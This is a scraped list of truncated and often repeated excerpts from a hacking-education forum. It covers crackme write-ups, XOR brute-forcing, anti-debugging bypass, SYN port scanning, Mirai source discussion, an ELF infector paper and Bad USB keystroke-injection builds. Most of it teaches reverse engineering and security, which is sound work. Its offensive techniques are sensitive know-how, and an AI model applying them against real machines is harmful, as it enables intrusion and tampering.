yeah, Perl wooooooooooo!! Though I\u2019m still very new to it. As for the message\u2026 Sure\u2026 Sure thing.  Oh yeah, thanks for another challenge.", "Continuing the discussion from Challenge: Brute and Smart: Did you solved the Brute and Smart challenge (Challenge: Brute and Smart)? In case you did and you wonder if your solution was right or you didn\u2019t solve it and you wonder how to do it\u2026 here is my write up. The program asked for a 6 digit l&hellip;", "Very good @dtm. This was actually a pretty smart approach. And kudos for using Perl  Did you actually got enlightened by the hidden message  ? I will publish the write up in a while with all the details in a while", "Okay, I finally decided to make a brute-forcing script so here it is: #!/usr/bin/perl -w# this is the encoded string, it&#39;s cut off and I&#39;m too lazy to reopen my VM so figure it out yourself LOLmy @arr = ( 0x6b, 0x5c, 0x57, 0x11, 0x5d, 0x43, 0x4c, 0x49, 0x08, 0x1e, 0x1a, 0x43, 0x50, 0x5c, 0x51, &hellip;", "#Goal Find the password and get enlightened by the secret message. No hints for this one. I will provide hints in the unlikely case that nobody solves this in the next 24h. The ChallengeAs usual, get the binary paste the text below in a file and get the binary with: cat data | base64 -d | gunzi&hellip;", "This is the first hint. By now, you should have figure out that the program has encrypted the target string using XOR encryption and that the key is not stored in the code at all. You need to find the key by brute forcing the password. Here it goes the hint: If P is the plain text, C is the crypt&hellip;", "Well, the title of the challenge was a hint in a sense. Once you have reversed the program, you get enough intel to try a quite selective brute force attack. In a while I will release a crucial hint to solve the challenge very quickly.", "I\u2019ve reversed it but I\u2019m not yet sure how to undo the operation with a guaranteed key\u2026 and I can\u2019t be bothered writing a script to brute force it.", "I\u2019m ASM-illiterate (@dtm\u2019s words) and I\u2019m still trying to do this!", "#Goal Find the password and get enlightened by the secret message. No hints for this one. I will provide hints in the unlikely case that nobody solves this in the next 24h. The ChallengeAs usual, get the binary paste the text below in a file and get the binary with: cat data | base64 -d | gunzi&hellip;", "#Goal Find the password and get enlightened by the secret message. No hints for this one. I will provide hints in the unlikely case that nobody solves this in the next 24h. The ChallengeAs usual, get the binary paste the text below in a file and get the binary with: cat data | base64 -d | gunzi&hellip;", "Sure, use it as it better suits you", "Thanks for the challenge. Here is my solution @oaktree. When reversing any application, we will want to see how it behaves to gain as many clues as we can so we know where to start. Run the application. [image] We get a string Invaild key! so let\u2019s search for the string. Make sure you get the (&hellip;", "Sure, use it as it better suits you", "Nice paper. Mind if I reference this paper in my Wannabe Series? All in all, nice. Cheers.", "Four words : In RFC we trust Good job mate !", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "Windows? Would you mind compiling for Linux x86_64 as well?", "Then FIN is the equivalent to the SYN flag for ordered disconnection. There is again a interchange of packets to ensure that whatever has been sent arrives to the destination. The wiki has a good general description https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_termination A&hellip;", "Hell Yeah!! I wasnt probably here when this was submitted, but its great, i think i gotta spider the site a bit .", "LEVEL: Beginner Port scanning is the process of finding out which ports are open in a given machine. An open port usually means a program listening on that port, and a program means bugs, and bugs means exploits\u2026 roughly :). OK, everybody in the world uses nmap for this task. It would be stupid to&hellip;", "Then FIN is the equivalent to the SYN flag for ordered disconnection. There is again a interchange of packets to ensure that whatever has been sent arrives to the destination. The wiki has a good general description https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_termination A&hellip;", "Thanks for sharing. I took a quick look to the code and it is surprisingly easy to follow. I suggest to anybody interested on low level networking (packet crafting) to take a look. I have to say, that it does not look like a DoS and definitely not a DDoS tool. It fills more like a networking diagn&hellip;", "Then FIN is the equivalent to the SYN flag for ordered disconnection. There is again a interchange of packets to ensure that whatever has been sent arrives to the destination. The wiki has a good general description https://en.wikipedia.org/wiki/Transmission_Control_Protocol#Connection_termination A&hellip;", "Very nice! That has made me understand a hell of a lot more!! So what about Sending a FIN packet? Is that used for an entirely different scenario as well?", "Summing up: In order to know the state of the port (Open|Close|Filtered) you do not need to send a RST packet. You will know the state when you get the first packet from the remote machine, independently of sending an extra RST or not.If a SYN|ACK packet is received the port is OPENif a RST o&hellip;", "Summing up: In order to know the state of the port (Open|Close|Filtered) you do not need to send a RST packet. You will know the state when you get the first packet from the remote machine, independently of sending an extra RST or not.If a SYN|ACK packet is received the port is OPENif a RST o&hellip;", "Summing up: In order to know the state of the port (Open|Close|Filtered) you do not need to send a RST packet. You will know the state when you get the first packet from the remote machine, independently of sending an extra RST or not.If a SYN|ACK packet is received the port is OPENif a RST o&hellip;", "Summing up: In order to know the state of the port (Open|Close|Filtered) you do not need to send a RST packet. You will know the state when you get the first packet from the remote machine, independently of sending an extra RST or not.If a SYN|ACK packet is received the port is OPENif a RST o&hellip;", "Summing up: In order to know the state of the port (Open|Close|Filtered) you do not need to send a RST packet. You will know the state when you get the first packet from the remote machine, independently of sending an extra RST or not.If a SYN|ACK packet is received the port is OPENif a RST o&hellip;", "AFAIK no port scanner sends a RST packet during the scan. Only the SYN packet is sent. What happens is that, as we are not calling connect the TCP/IP stack in the kernel does not know about any connection going on and it responds to the unexpected SYN|ACK packet with a RST, as it does for any unexp&hellip;", "AFAIK no port scanner sends a RST packet during the scan. Only the SYN packet is sent. What happens is that, as we are not calling connect the TCP/IP stack in the kernel does not know about any connection going on and it responds to the unexpected SYN|ACK packet with a RST, as it does for any unexp&hellip;", "It\u2019s not that the attacker needs to send the packet, it\u2019s that the victim needs to receive one. Due to TCP\u2019s error checking/correction, if you did stop the outgoing RST packets, the victim will follow protocol and keep sending SYN-ACK packets until it gets a response or times out (if the port is ope&hellip;", "AFAIK no port scanner sends a RST packet during the scan. Only the SYN packet is sent. What happens is that, as we are not calling connect the TCP/IP stack in the kernel does not know about any connection going on and it responds to the unexpected SYN|ACK packet with a RST, as it does for any unexp&hellip;", "AFAIK no port scanner sends a RST packet during the scan. Only the SYN packet is sent. What happens is that, as we are not calling connect the TCP/IP stack in the kernel does not know about any connection going on and it responds to the unexpected SYN|ACK packet with a RST, as it does for any unexp&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "My issues were resolved by: reinstall virtualbox$ sudo dpkg-reconfigure virtualbox-dkms$ sudo dpkg-reconfigure virtualbox", "With the announcement of pupper and a few other things over these last few months, our collaborative effort is off to a nice start. Many of us regulars have been working together on a handful of projects. We\u2019re now offering a place to put all those projects! In order to draw in more of you, the Adm&hellip;", "Hello 0x00\u2019ers! Hope you\u2019re having a snappy day. I hope you\u2019re excited because a load of new things are coming to 0x00sec Announcement 0x00 - Tool Release - PupperA few days ago I was talking to some people on the IRC, and they commented that it would be absolutely awesome to have some kind of to&hellip;", "Hello my 0x00sec - Padawans! In this instalment of Paranoia and a Terminal, I am showing you how to create + use (my) AWESOME tmuxinator setup. Person: \u201cErrrr. Whats that?\u201d Me: \u201cIt\u2019s a sort of automation package for tmux\u201d Person: \u201cCoool!.. So. Whats tmux?\u201d Me: \u201cTmux is a Terminal Multiplexer, so&hellip;", "Still getting mad issues on Ubuntu 15.10. Going to try to resolve at some point\u2026", "Hello, my 0x00\u2019ers! You may have noticed @0x00pf\u2019s awesome reverse engineering content, and you may have noticed he has posted raw binaries (without source), now, of course, it\u2019s reverse engineering, the challenge is about not knowing the source. But how do you and I know that @0x00pf is not a mad &hellip;", "if-then is NOT a loop, it\u2019s a conditional statement.", "[image] LEVEL: VERY EASY Note: The image was not generated with any steganography tool. Note2: In this case, the message can be extracted without coding. Hint 1:GIMP is your friend Hint 1.5:Use the Color&gt;Components&gt;Decompose to get the image components separated. Hint 2:PGM format saves grey s&hellip;", "As requested here is the program used to produce the image for the Basic Stego challenge we published yesterday. If you are still trying to solve it, you may want to wait to read this. The image was generated with a very simple C program using libgd. `libgd\u2019 (http://libgd.github.io/) is a classica&hellip;", "Hello, my 0x00\u2019ers! You may have noticed @0x00pf\u2019s awesome reverse engineering content, and you may have noticed he has posted raw binaries (without source), now, of course, it\u2019s reverse engineering, the challenge is about not knowing the source. But how do you and I know that @0x00pf is not a mad &hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Just awesome ! I came to have a quick look at new posts and stayed with reading thruogh your full article . Great explanation of the basics!", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "HELL YES. DOING IT NOW. You guys are so awesome", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "Continuing the discussion from [KEYGENME - EASY] Cracking Your First Program: As requested by @pry0cc, this is a crash course on reverse engineering. Before reading this, you should try to solve @dtm challenge: If you didn\u2019t manage or you want to see somebody else solution keep reading. Our Tar&hellip;", "You\u2019re more than welcome to write your analysis.", "You\u2019re more than welcome to write your analysis.", "It\u2019s radare2 and it\u2019s an open-source RE framework. There is plenty of documentation around it and it\u2019s on the rise. Quite of a pain in the ass to master it though. Have a look at this link in case you are interested in getting started with it: https://blog.techorganic.com/2016/03/08/radare-2-in-0x1&hellip;", "Sorry about that. If @dtm is OK I can publish a more detailed explanation. I mean, maybe he wants to write such a paper himself. As @_py mentioned below radare2 is a reverse engineering tool\u2026 it automates a lot of things and, in general, simplifies the whole process.", "Right I\u2019m still not fully sure what you\u2019ve done? Using a program called r2? I apologize since I\u2019m an insane noob at RE but would love to be more proficient at it, especially in Linux.", "Right I\u2019m still not fully sure what you\u2019ve done? Using a program called r2? I apologize since I\u2019m an insane noob at RE but would love to be more proficient at it, especially in Linux.", "Sure The easiest way is to use radare 2 Sorry about the image do not know how to make it bigger. it says: $ r2 ./k [xxxx] aa [xxxx] pdf @main  [image]You can see in the assembly how the program opens a file named \u2018keyfile.dat\u2019 and then reads its content using fread into memory. Then, the re&hellip;", "Sure The easiest way is to use radare 2 Sorry about the image do not know how to make it bigger. it says: $ r2 ./k [xxxx] aa [xxxx] pdf @main  [image]You can see in the assembly how the program opens a file named \u2018keyfile.dat\u2019 and then reads its content using fread into memory. Then, the re&hellip;", "Sure The easiest way is to use radare 2 Sorry about the image do not know how to make it bigger. it says: $ r2 ./k [xxxx] aa [xxxx] pdf @main  [image]You can see in the assembly how the program opens a file named \u2018keyfile.dat\u2019 and then reads its content using fread into memory. Then, the re&hellip;", "Not sure how to interpret that sentence\u2026 I\u2019d say thanks\u2026 just in case", "Would you be able to direct me to how you got there?", "Hey mates, in the last part I used MSIL to add a File.WriteAllBytes() call, for dumping the packed executable. This time I show you a much easier way for dumping .NET-applications called MegaDumper. MegaDumperMegaDumper is a tool which can easily dump .NET-executables directly from memory withou&hellip;", "Hey @SmartOne, if you try to search for USB Flash controllers datasheets you will not find many that can be flashed over the USB interface. Many have some special interface (you have to hook up wires in those little pins) and most of them requires some proprietary tools that you only get if you are &hellip;", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "Yes. I know. When I edit the post it looks OK in the edit window, but when I submit the update, the tag is not processed. Do not know why", "Yes. I know. When I edit the post it looks OK in the edit window, but when I submit the update, the tag is not processed. Do not know why", "@0x00pf: The spoiler tags in your post don\u2019t seem to work in my browser, while these in the comments do work. Could you check it? Screenshot:  [image]", "@0x00pf: The spoiler tags in your post don\u2019t seem to work in my browser, while these in the comments do work. Could you check it? Screenshot:  [image]", "Not really. Your solution is perfectly fine. I tried to make something extra happen for you guys but, looking to the solutions, it obvious requires some more work on my side\u2026 Maybe in the next one Regarding the antidebug\u2026 @dtm solution works fine. Other option is: Change the _pt function to imme&hellip;", "Not really. Your solution is perfectly fine. I tried to make something extra happen for you guys but, looking to the solutions, it obvious requires some more work on my side\u2026 Maybe in the next one Regarding the antidebug\u2026 @dtm solution works fine. Other option is: Change the _pt function to imme&hellip;", "Not really. Your solution is perfectly fine. I tried to make something extra happen for you guys but, looking to the solutions, it obvious requires some more work on my side\u2026 Maybe in the next one Regarding the antidebug\u2026 @dtm solution works fine. Other option is: Change the _pt function to imme&hellip;", "Here\u2019s how you bypass the anti-debugging: The cdg function contains the pt function, prints that failure message and then exits the program IIRC. To get rid of this, simply NOP fill the function call to the cdg function in the st1 function, i.e., replace the five bytes of the call with 0x90. [ima&hellip;", "@0x00pf: Yes, I used the -S flag if that\u2019s what you are referring to but all I got was the disassembly with some ROT13 encrypted text in between some sections which led me to the same decryption result as the strings command. I didn\u2019t decrypt it all because it looked familiar as I said but I might h&hellip;", "Well done @_py!.. You went through most of the hidden features in this crackme! I see you used objdump most of the time. Did you try the flags suggested in the hints after running the program at least once? I\u2019ll post the sources and some explanations probably next week Thanks @_py and @dtm for tr&hellip;", "@0x00pf: Yes, I used the -S flag if that\u2019s what you are referring to but all I got was the disassembly with some ROT13 encrypted text in between some sections which led me to the same decryption result as the strings command. I didn\u2019t decrypt it all because it looked familiar as I said but I might h&hellip;", "Well done @_py!.. You went through most of the hidden features in this crackme! I see you used objdump most of the time. Did you try the flags suggested in the hints after running the program at least once? I\u2019ll post the sources and some explanations probably next week Thanks @_py and @dtm for tr&hellip;", "Alright so, my initial thought was straight to GDB, but after seeing the \u201cantidebug\u201d tag and combined with the recent ptrace post, I thought that there\u2019d be definitely a call to ptrace to stop the executable from being traced. Which was indeed the case since the output of strace was:  [image]Thu&hellip;", "Alright so, my initial thought was straight to GDB, but after seeing the \u201cantidebug\u201d tag and combined with the recent ptrace post, I thought that there\u2019d be definitely a call to ptrace to stop the executable from being traced. Which was indeed the case since the output of strace was:  [image]Thu&hellip;", "Yes SMALI is pretty alike. I prefer MSIL because due to its well-ordered structure, although SMALI got the better instruction names\u2026 It\u2019s a hard decision .", "Well in my oppinion it\u2019s better to have more theory, because I read the arcticles often with my mobilephone. But I also think you can do each 3 articles 1 practise article. In this case you get and practise your knowledge better  But like @0x00pf said: Do it like you want to do as long you do it. D&hellip;", "Well in my oppinion it\u2019s better to have more theory, because I read the arcticles often with my mobilephone. But I also think you can do each 3 articles 1 practise article. In this case you get and practise your knowledge better  But like @0x00pf said: Do it like you want to do as long you do it. D&hellip;", "Yes SMALI is pretty alike. I prefer MSIL because due to its well-ordered structure, although SMALI got the better instruction names\u2026 It\u2019s a hard decision .", "Great tut!.. This MSIL is pretty similar to Java bytecodes, also stack-based, instead of register based solutions as Parrot (actually PASM). Looking forward to the next tutorial!", "Hey mates, today I\u2019ve got a much more interesting challenge for you to solve . We\u2019ll reverse a CrackMe and expand our skills in MSIL Patching to dump the unpacked executable straight from within the program. This will be much more complicated than our copy &amp; paste solution from last time but when y&hellip;", "@0x00pf: yep, solved it. I will post my solution soon(currently in class).", "@0x00pf: yep, solved it. I will post my solution soon(currently in class).", "@dtm I should have foreseen that you could make it with a bit of static analysis\u2026 I may try to made a few changes to make it a bit more interesting\u2026 it\u2019s time to move to another obfuscation thecnique  @_py Good catch, you solved the crypto part. Did you try to go further with those hints?.. hope &hellip;", "Thanks for another challenge, @0x00pf. To retrieve the information, the identification of the XOR encryption was required. In this case, the decryption key was 0x2a which is found in the mp (this function prints to the command line using write) function as well as the ck (password-checking) functi&hellip;", "Okay, I\u2019ll try to do my best . Probably I\u2019ll support the use as a challenge but focus on the theory.", "Long time since I do not post a challenge and, once again, inspired by @TheDoctor  I come up with something for you to have some fun. This is not expected to be easy\u2026 but you never know, I may have overlooked something obvious\u2026 Also it is something new (at least for me), so let me know if you expe&hellip;", "Long time since I do not post a challenge and, once again, inspired by @TheDoctor  I come up with something for you to have some fun. This is not expected to be easy\u2026 but you never know, I may have overlooked something obvious\u2026 Also it is something new (at least for me), so let me know if you expe&hellip;", "Thanks for another challenge, @0x00pf. To retrieve the information, the identification of the XOR encryption was required. In this case, the decryption key was 0x2a which is found in the mp (this function prints to the command line using write) function as well as the ck (password-checking) functi&hellip;", "Long time since I do not post a challenge and, once again, inspired by @TheDoctor  I come up with something for you to have some fun. This is not expected to be easy\u2026 but you never know, I may have overlooked something obvious\u2026 Also it is something new (at least for me), so let me know if you expe&hellip;", "I guess you have heard about the Mirai BotNet. Everybody was talking about it because of some massive DDoS from IoT devices. Then, early this month, its source code was released: Finally, I manage to take a look to the source code and\u2026 there is a lot of interesting stuff in there!!! Take a look &hellip;", "Okay, I\u2019ll try to do my best . Probably I\u2019ll support the use as a challenge but focus on the theory.", "Actually I prefer a mix, but I know that is double work for you! In any flavour you decide, just keep it up!", "[meme]", "Actually I prefer a mix, but I know that is double work for you! In any flavour you decide, just keep it up!", "Hey mates! After I\u2019ve thought about some new parts of my C# Reverse Engineering series, I came to the point about the right balance between theory and practice. Because I don\u2019t know what you want I thought of just asking you . I prefer a more challenge-like structureI prefer a more theoretica&hellip;", "I guess you have heard about the Mirai BotNet. Everybody was talking about it because of some massive DDoS from IoT devices. Then, early this month, its source code was released: Finally, I manage to take a look to the source code and\u2026 there is a lot of interesting stuff in there!!! Take a look &hellip;", "Long time since I do not post a challenge and, once again, inspired by @TheDoctor  I come up with something for you to have some fun. This is not expected to be easy\u2026 but you never know, I may have overlooked something obvious\u2026 Also it is something new (at least for me), so let me know if you expe&hellip;", "I guess you have heard about the Mirai BotNet. Everybody was talking about it because of some massive DDoS from IoT devices. Then, early this month, its source code was released: Finally, I manage to take a look to the source code and\u2026 there is a lot of interesting stuff in there!!! Take a look &hellip;", "I guess you have heard about the Mirai BotNet. Everybody was talking about it because of some massive DDoS from IoT devices. Then, early this month, its source code was released: Finally, I manage to take a look to the source code and\u2026 there is a lot of interesting stuff in there!!! Take a look &hellip;", "Hey mates! Maybe some of the elder members remember my series about C# CrackMe Challenges. After a little break where I focussed on other stuff I\u2019m now back with an introduction to MSIL patching. Before you start with this post I recommend you to have a look at my other parts first . They teach som&hellip;", "Good catch @_py . I would like to say that it was in purpose to see if people was following the paper\u2026 but it was just a mistake", "Do you know your Android phone have a shell?. Do you know that it is a reduced version of busybox?. Do you know you can recompile it and add some important missing applets? If you don\u2019t, keep reading. This is gonna be quick and easy! NOTE: This a rewrite of something I wrote some time ago for othe&hellip;", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "Nice username xD really fitting in with the 0x00sec theme", "Really enjoyed this writeup, the way you teach is quite effective!", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "It\u2019s been a while since the last edition (I feel like I say this every time). What you\u2019re looking at is the sixth installment of my [C] Dynamic Memory Series. I\u2019ll start this paper by enumerating some prerequisites: Proficiency in CUnderstanding of the Stack vs HeapUnderstanding of sbrk and br&hellip;", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "This is actually better than the book I\u2019m reading on ASM. Now I understand most of the things that I was missing. Thanks for writing this, it\u2019s really really helpful", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "If you had read Part II of this series you may have missed a couple of details. Consider this post as a short addendum to Part II including those details. The first you may have noted is that there was no ARM or MIPS code in there. Actually, the paper was already quite long and, to be honest, I tho&hellip;", "Awesome serie. Great for people new to the concept", "As it doesn\u2019t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector paper from @dtm but targeting ELF binaries specifically under GNU/Linux systems. The process I will describe is slightly different from the one explained in the PE counte&hellip;", "Good catch @_py . I would like to say that it was in purpose to see if people was following the paper\u2026 but it was just a mistake", "Its cool. It maintains everything and is borderline readable. Plus its easily recognisable.", "Good catch @_py . I would like to say that it was in purpose to see if people was following the paper\u2026 but it was just a mistake", "I might be a little late on that but I was reading through it again and I noticed that sentence. I think you mean string table instead of symbol table(?) Thus the \u201c&amp;shdr[elf_hdr-&gt;e_shstrndx];\u201d  and \u201cshdr[i].sh_name\u201d parts of your code which point to the string table section and the index into the s&hellip;", "I might be a little late on that but I was reading through it again and I noticed that sentence. I think you mean string table instead of symbol table(?) Thus the \u201c&amp;shdr[elf_hdr-&gt;e_shstrndx];\u201d  and \u201cshdr[i].sh_name\u201d parts of your code which point to the string table section and the index into the s&hellip;", "LOL. Nice riddle!  How to get it: Open the site and take a look at the HTML-Code: &lt;html&gt;&lt;head&gt;&lt;script src=&quot;load.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;/body&gt;&lt;h1&gt; Hello! &lt;/h1&gt;&lt;p&gt; Can you find &lt;a href=&quot;#Nice-try-you-sucker&quot;&gt;me?&lt;/a&gt; ... &lt;/p&gt;&lt;/html&gt;After falling for the awesome trap, you\u2019ll instantly&hellip;", "Hey lads! Somebody asked me earlier for a screenshot of my setup. I thought it would be a little too easy if I just gave him the link, so I decided to make a dead-simple CTF. However, a lot of people haven\u2019t actually found the answer? So I present the challenge to you. Can you find the URL? https:&hellip;", "Good trick\u2026 I\u2019ll try", "Add this method to the setup and remove the first delay. The method will wait til teensy is detected as a keyboard, this will save you some time. Original Code: https://github.com/samyk/usbdriveby/blob/master/usbdriveby_windows.ino void waitForDrivers()        {            while (!(keyboard_leds&hellip;", "Hey @SmartOne, if you try to search for USB Flash controllers datasheets you will not find many that can be flashed over the USB interface. Many have some special interface (you have to hook up wires in those little pins) and most of them requires some proprietary tools that you only get if you are &hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Hey @SmartOne, if you try to search for USB Flash controllers datasheets you will not find many that can be flashed over the USB interface. Many have some special interface (you have to hook up wires in those little pins) and most of them requires some proprietary tools that you only get if you are &hellip;", "#Tiling Window Managers Hey, I am worz/ovtru3. Most of you know me, I have been on the IRC for about two months now. I had promised @pry0cc to do an article on tiling window managers, because few days ago, I was experimenting with almost all the major ones. At last, I settled with i3wm, because it &hellip;", "If you are reading this is because you want to be a hacker. Therefore, you are automatically a wannabe. It does not sound that cool, but it is actually pretty cool. It means that you still have a lot of exciting things to discover!!! First things first. This is going to be a joint course on C and a&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "Hey @SmartOne, if you try to search for USB Flash controllers datasheets you will not find many that can be flashed over the USB interface. Many have some special interface (you have to hook up wires in those little pins) and most of them requires some proprietary tools that you only get if you are &hellip;", "Great post @0x00pf! Just an fyi/clarification: Object code is also known as relocatable code. The reason for that is because many functions / variables will probably not be known to your executable until runtime (i.e printf() which is defined in libc, which is a shared object). Thus, the object co&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Great post @0x00pf! Just an fyi/clarification: Object code is also known as relocatable code. The reason for that is because many functions / variables will probably not be known to your executable until runtime (i.e printf() which is defined in libc, which is a shared object). Thus, the object co&hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "Glad to see you have come back to this humble course. Hope you are eager to get a lot more stuff to digest. Grab some coffee and relax. I have been claiming that this course is going to be different to all those that you find over the Internet. Right now, I should introduce a whole bunch of boring &hellip;", "More or less. I wrote my own code.", "More or less. I wrote my own code.", "Loving this!! Might have to do this\u2026 Good job pico  - as always", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "A question that @0x00pf may be able to answer: Why does the hack only possible with the Phison microcontroller? Is it the only one vulnerable or did no one create \u201chacks\u201d for other microcontrollers? Anyway, great post!", "Thank you for the clarification! I always had a dream of a \u201cvirus\u201d that turns plugged in usb\u2019s into bad usbs, but that doesn\u2019t seem possible", "The USBarmory is a very neat device. It is more powerful that Arietta, but it cost more than 3 times more\u2026 Thanks for sharing the videos\u2026 Haven\u2019t read the blog post yet", "Thank you for the clarification! I always had a dream of a \u201cvirus\u201d that turns plugged in usb\u2019s into bad usbs, but that doesn\u2019t seem possible", "Hey @SmartOne, if you try to search for USB Flash controllers datasheets you will not find many that can be flashed over the USB interface. Many have some special interface (you have to hook up wires in those little pins) and most of them requires some proprietary tools that you only get if you are &hellip;", "Just tried the same type of thing on an Arduino Leonardo!", "Did it worked?..I tried some simple test with the Leonardo some time ago. Do not remember if they use the same functions for the HID functionality.", "The USBarmory is a very neat device. It is more powerful that Arietta, but it cost more than 3 times more\u2026 Thanks for sharing the videos\u2026 Haven\u2019t read the blog post yet", "Thanks for sharing the Arietta board, looks very nice! I also find this video very interesting, because it shows the great possibilities of usb attacks!  The board used in the video also seems great. All in all, as always a high quality article by @0x00pf", "Hey @SmartOne, if you try to search for USB Flash controllers datasheets you will not find many that can be flashed over the USB interface. Many have some special interface (you have to hook up wires in those little pins) and most of them requires some proprietary tools that you only get if you are &hellip;", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "Thanks for sharing the Arietta board, looks very nice! I also find this video very interesting, because it shows the great possibilities of usb attacks!  The board used in the video also seems great. All in all, as always a high quality article by @0x00pf", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "A question that @0x00pf may be able to answer: Why does the hack only possible with the Phison microcontroller? Is it the only one vulnerable or did no one create \u201chacks\u201d for other microcontrollers? Anyway, great post!", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "Continuing the discussion from Plug In To Win - DIY Bad USB [Part 3/3]: You may have read the awesome \u201cPlug In To Win\u201d series from @TheDoctor. It make me recall some experiments I did time ago on HID injection. After some private chat, we agreed to release this extra post to present one more HW alt&hellip;", "Continuing the discussion from Plug In To 